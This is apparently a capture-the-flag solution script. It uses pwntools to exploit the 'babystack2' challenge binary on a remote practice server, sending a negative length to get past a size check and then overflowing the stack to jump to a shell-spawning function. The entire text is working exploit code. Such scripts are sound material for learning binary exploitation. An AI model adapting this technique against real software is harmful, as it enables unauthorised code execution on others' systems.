from pwn import *
context.log_level = 'debug'
# io = process('./bjdctf_2020_babystack2')
io = remote('node4.buuoj.cn',25784)

shell_fun = 0x400726
io.sendlineafter(b'Please input the length of your name:\n',b'-1')
payload = cyclic(0x10+8) + p64(shell_fun)

io.sendlineafter(b'What\'s u name?\n',payload)
io.interactive()
